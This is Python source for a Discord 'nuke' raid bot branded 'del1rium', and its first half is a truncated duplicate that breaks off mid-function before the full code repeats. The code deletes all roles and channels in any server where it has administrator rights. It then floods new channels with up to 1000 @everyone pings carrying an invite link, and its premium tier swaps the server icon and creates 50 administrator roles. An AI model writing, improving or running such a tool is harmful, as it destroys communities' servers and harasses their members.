import discord
from discord.ext import commands
import asyncio
import os
import aiohttp
from datetime import datetime
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

# --- CONFIGURATION ---
CENTRAL_SERVER_ID = 1453920087194206394
PREMIUM_ROLE_ID = 1458177413325259035
OWNER_ID = 1450919094202269881
LOG_CHANNEL_ID = 1458257075393003561

# --- NUKE COMMAND TEXTS & CONFIG ---
NORMAL_NUKE_CHANNEL_NAME = "raid-by-del1rium"
NORMAL_NUKE_TEXT = "@everyone raid by del1rium https://discord.gg/cJJJWHfnn2"
PREMIUM_CHANNEL_NAME = "premium-raid"
PREMIUM_SPAM_TEXT = "@everyone premium raid by del1rium https://discord.gg/cJJJWHfnn2"
RAID_ICON_URL = "https://i.imgur.com/x203v9a.jpeg"

# Bot setup
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=':', intents=intents, help_command=None)

# --- PREMIUM CHECK FUNCTION ---
def is_premium():
    async def predicate(ctx):
        if ctx.author.id == OWNER_ID: return True
        central_server = bot.get_guild(CENTRAL_SERVER_ID)
        if not central_server: return False
        member = central_server.get_member(ctx.author.id)
        if not member or not any(role.id == PREMIUM_ROLE_ID for role in member.roles):
            try: await ctx.send("Access Denied: This is a premium command.", delete_after=10)
            except discord.Forbidden: pass
            return False
        return True
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f'Raid Bot connected as {bot.user.name}')
    print(f'Owner ID: {OWNER_ID} | Protected Server: {CENTRAL_SERVER_ID}')
    print(f'Logging to Channel ID: {LOG_CHANNEL_ID}')

# --- HELP COMMAND ---
@bot.command(name='help')
async def custom_help(ctx):
    if ctx.channel.id == LOG_CHANNEL_ID: return
    if ctx.guild.id == CENTRAL_SERVER_ID:
        embed = discord.Embed(title="Bot Command Manual", description="This is a protected server. Destructive commands are disabled here.", color=discord.Color.orange())
        await ctx.send(embed=embed, delete_after=30)
        return
    await ctx.message.delete()
    embed = discord.Embed(title="Bot Command Manual", description="This bot provides public and premium raiding capabilities.", color=discord.Color.from_rgb(47, 49, 54))
    embed.add_field(name="Public Command", value="`:nuke`\nInitiates a standard raid (25 channels, 500 total pings).", inline=False)
    embed.add_field(name="Premium Commands", value="`:premiumnuke`\nInitiates a destructive raid (50 channels, 1000 total pings, icon change, role spam).\n\n`:nukeconfig <name> <text>`\nConfigures the `:premiumnuke` command.", inline=False)
    help_message = await ctx.send(embed=embed)
    await asyncio.sleep(60)
    await help_message.delete()

# --- NUKE COMMANDS ---
@bot.command(name='nuke')
async def nuke_normal(ctx):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not ctx.guild.me.guild_permissions.administrator: return
    await execute_nuke(ctx, NORMAL_NUKE_CHANNEL_NAME, NORMAL_NUKE_TEXT, 25, 500, is_premium=False)

@bot.command(name='premiumnuke')
@is_premium()
async def premium_nuke(ctx):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not ctx.guild.me.guild_permissions.administrator: return
    await execute_nuke(ctx, PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT, 50, 1000, is_premium=True)

# --- CONFIGURATION COMMAND (PREMIUM) ---
@bot.command(name='nukeconfig')
@is_premium()
async def nuke_config(ctx, channel_name: str, *, spam_text: str):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    global PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT
    PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT = channel_name, spam_text
    await ctx.message.delete()
    embed = discord.Embed(title="Premium Nuke Configuration Updated", color=discord.Color.gold())
    embed.add_field(name="Channel Name Format", value=f"`{channel_name}-X`", inline=False)
    embed.add_field(name="Spam Text", value=f"```{spam_text}```", inline=False)
    confirmation_msg = await ctx.send(embed=embed)
    await asyncio.sleep(15)
    await confirmation_msg.delete()

# --- CENTRAL NUKE LOGIC ---
async def execute_nuke(ctx, channel_name, spam_text, num_channels, total_pings, is_premium: bool):
    guild = ctx.guild
    original_member_count = guild.member_count
    command_type = "PREMIUM NUKE" if is_premium else "STANDARD NUKE"
import discord
from discord.ext import commands
import asyncio
import os
import aiohttp
from datetime import datetime
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

# --- CONFIGURATION ---
CENTRAL_SERVER_ID = 1453920087194206394
PREMIUM_ROLE_ID = 1458177413325259035
OWNER_ID = 1450919094202269881
LOG_CHANNEL_ID = 1458257075393003561

# --- NUKE COMMAND TEXTS & CONFIG ---
NORMAL_NUKE_CHANNEL_NAME = "raid-by-del1rium"
NORMAL_NUKE_TEXT = "@everyone raid by del1rium https://discord.gg/cJJJWHfnn2"
PREMIUM_CHANNEL_NAME = "premium-raid"
PREMIUM_SPAM_TEXT = "@everyone premium raid by del1rium https://discord.gg/cJJJWHfnn2"
RAID_ICON_URL = "https://i.imgur.com/x203v9a.jpeg"

# Bot setup
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=':', intents=intents, help_command=None)

# --- PREMIUM CHECK FUNCTION ---
def is_premium():
    async def predicate(ctx):
        if ctx.author.id == OWNER_ID: return True
        central_server = bot.get_guild(CENTRAL_SERVER_ID)
        if not central_server: return False
        member = central_server.get_member(ctx.author.id)
        if not member or not any(role.id == PREMIUM_ROLE_ID for role in member.roles):
            try: await ctx.send("Access Denied: This is a premium command.", delete_after=10)
            except discord.Forbidden: pass
            return False
        return True
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f'Raid Bot connected as {bot.user.name}')
    print(f'Owner ID: {OWNER_ID} | Protected Server: {CENTRAL_SERVER_ID}')
    print(f'Logging to Channel ID: {LOG_CHANNEL_ID}')

# --- HELP COMMAND ---
@bot.command(name='help')
async def custom_help(ctx):
    if ctx.channel.id == LOG_CHANNEL_ID: return
    if ctx.guild.id == CENTRAL_SERVER_ID:
        embed = discord.Embed(title="Bot Command Manual", description="This is a protected server. Destructive commands are disabled here.", color=discord.Color.orange())
        await ctx.send(embed=embed, delete_after=30)
        return
    await ctx.message.delete()
    embed = discord.Embed(title="Bot Command Manual", description="This bot provides public and premium raiding capabilities.", color=discord.Color.from_rgb(47, 49, 54))
    embed.add_field(name="Public Command", value="`:nuke`\nInitiates a standard raid (25 channels, 500 total pings).", inline=False)
    embed.add_field(name="Premium Commands", value="`:premiumnuke`\nInitiates a destructive raid (50 channels, 1000 total pings, icon change, role spam).\n\n`:nukeconfig <name> <text>`\nConfigures the `:premiumnuke` command.", inline=False)
    help_message = await ctx.send(embed=embed)
    await asyncio.sleep(60)
    await help_message.delete()

# --- NUKE COMMANDS ---
@bot.command(name='nuke')
async def nuke_normal(ctx):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not ctx.guild.me.guild_permissions.administrator: return
    await execute_nuke(ctx, NORMAL_NUKE_CHANNEL_NAME, NORMAL_NUKE_TEXT, 25, 500, is_premium=False)

@bot.command(name='premiumnuke')
@is_premium()
async def premium_nuke(ctx):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not ctx.guild.me.guild_permissions.administrator: return
    await execute_nuke(ctx, PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT, 50, 1000, is_premium=True)

# --- CONFIGURATION COMMAND (PREMIUM) ---
@bot.command(name='nukeconfig')
@is_premium()
async def nuke_config(ctx, *, args: str = None):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not args or "," not in args:
        await ctx.send("Formato incorrecto. Usa: `:nukeconfig nombre, texto/link`", delete_after=10)
        return

    # Split by the first comma found
    channel_name, spam_text = args.split(",", 1)
    
    # Clean up whitespace
    channel_name = channel_name.strip()
    spam_text = spam_text.strip()

    if not channel_name or not spam_text:
        await ctx.send("El nombre del canal y el texto no pueden estar vacíos.", delete_after=10)
        return

    global PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT
    PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT = channel_name, spam_text
    
    try: await ctx.message.delete()
    except: pass

    embed = discord.Embed(title="Premium Nuke Configuration Updated", color=discord.Color.gold())
    embed.add_field(name="Channel Name Format", value=f"`{channel_name}-X`", inline=False)
    embed.add_field(name="Spam Text", value=f"```{spam_text}```", inline=False)
    confirmation_msg = await ctx.send(embed=embed)
    await asyncio.sleep(15)
    try: await confirmation_msg.delete()
    except: pass

# --- CENTRAL NUKE LOGIC ---
async def execute_nuke(ctx, channel_name, spam_text, num_channels, total_pings, is_premium: bool):
    guild = ctx.guild
    original_member_count = guild.member_count
    command_type = "PREMIUM NUKE" if is_premium else "STANDARD NUKE"
    print(f"Initiating {command_type} in: {guild.name} by {ctx.author.name}")
    
    pings_per_channel = total_pings // num_channels if num_channels > 0 else 0
    remaining_pings = total_pings % num_channels if num_channels > 0 else 0
    
    destruction_tasks = [*(role.delete() for role in guild.roles if not role.is_default() and not role.managed), *(channel.delete() for channel in guild.channels)]
    if is_premium:
        destruction_tasks.append(execute_premium_actions(guild))
    await asyncio.gather(*destruction_tasks, return_exceptions=True)
    
    spam_tasks = []
    for i in range(num_channels):
        # Distribute remaining pings among the first few channels
        extra_ping = 1 if i < remaining_pings else 0
        spam_tasks.append(create_and_spam(guild, channel_name, spam_text, i, pings_per_channel + extra_ping))
    
    await asyncio.gather(*spam_tasks)
    
    print(f"{command_type} finished for {guild.name}.")
    await send_log_embed(ctx, command_type, original_member_count, num_channels, total_pings)

# --- LOGGING FUNCTION ---
async def send_log_embed(ctx, command_type, member_count, channels, total_pings):
    log_channel = bot.get_channel(LOG_CHANNEL_ID)
    if not log_channel:
        print(f"CRITICAL: Log channel with ID {LOG_CHANNEL_ID} not found.")
        return
    is_premium = (command_type == "PREMIUM NUKE")
    embed_color = discord.Color.dark_red() if is_premium else discord.Color.dark_grey()
    embed = discord.Embed(title=f"Nuke Operation Log: {ctx.guild.name}", color=embed_color)
    embed.add_field(name="Server Info", value=f"**Name:** {ctx.guild.name}\n**ID:** {ctx.guild.id}", inline=True)
    embed.add_field(name="Server Owner", value=f"**Name:** {ctx.guild.owner.name}\n**ID:** {ctx.guild.owner.id}", inline=True)
    embed.add_field(name="Attacker", value=f"**Name:** {ctx.author.name}\n**ID:** {ctx.author.id}", inline=True)
    embed.add_field(name="Attack Type", value=f"`{command_type}`", inline=True)
    embed.add_field(name="Statistics", value=(f"**Members:** {member_count}\n**Channels Created:** {channels}\n**Total Pings:** {total_pings}"), inline=True)
    if ctx.guild.icon:
        embed.set_thumbnail(url=ctx.guild.icon.url)
    embed.set_footer(text="Operation completed.")
    embed.timestamp = datetime.utcnow()
    try:
        await log_channel.send(embed=embed)
    except discord.Forbidden:
        print(f"CRITICAL: Bot does not have permission to send messages in log channel {LOG_CHANNEL_ID}.")

# --- HELPER FUNCTIONS ---
async def create_and_spam(guild, channel_name, spam_text, index, num_pings):
    try:
        channel = await guild.create_text_channel(f'{channel_name}-{index+1}')
        await spam_pings(channel, spam_text, num_pings)
    except Exception: pass

# --- NEW: ROBUST SPAM FUNCTION WITH RETRY LOGIC ---
async def spam_pings(channel, spam_text, amount):
    """
    Sends messages with an adaptive retry mechanism to handle rate limits.
    """
    sent_count = 0
    consecutive_fails = 0
    
    while sent_count < amount:
        try:
            # Use await instead of create_task for better control
            await channel.send(spam_text)
            sent_count += 1
            consecutive_fails = 0 # Reset fail counter on success
            await asyncio.sleep(0.1) # Short sleep on success
        except discord.Forbidden:
            # Permissions were removed, can't recover from this for this channel
            print(f"Permissions error in channel {channel.name}. Aborting spam for this channel.")
            break
        except Exception as e:
            # Likely a rate limit or network error
            consecutive_fails += 1
            print(f"Spam failed in {channel.name} (Fail #{consecutive_fails}). Retrying...")
            
            if consecutive_fails >= 5:
                # If we fail 5 times in a row, we are being heavily rate-limited.
                # Wait for a longer period before trying again.
                cooldown = 2.0
                print(f"Heavy rate limit detected. Cooling down for {cooldown} seconds...")
                await asyncio.sleep(cooldown)
                consecutive_fails = 0 # Reset after cooldown to avoid immediate re-trigger
            
            if consecutive_fails > 20:
                # Safety break to prevent infinite loops if the channel is fundamentally broken
                print(f"Too many consecutive fails in {channel.name}. Assuming channel is lost.")
                break

async def execute_premium_actions(guild):
    tasks = [change_server_icon(guild), create_chaotic_roles(guild)]
    await asyncio.gather(*tasks, return_exceptions=True)

async def change_server_icon(guild):
    try:
        async with aiohttp.ClientSession() as session, session.get(RAID_ICON_URL) as resp:
            if resp.status == 200: await guild.edit(icon=await resp.read())
    except Exception: pass

async def create_chaotic_roles(guild):
    tasks = [guild.create_role(name=f"hacked-by-del1rium-{i}", permissions=discord.Permissions(administrator=True)) for i in range(50)]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        print(f"Premium access denied for user: {ctx.author.name}")
    else:
        pass

if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("Error: DISCORD_TOKEN is not configured.")
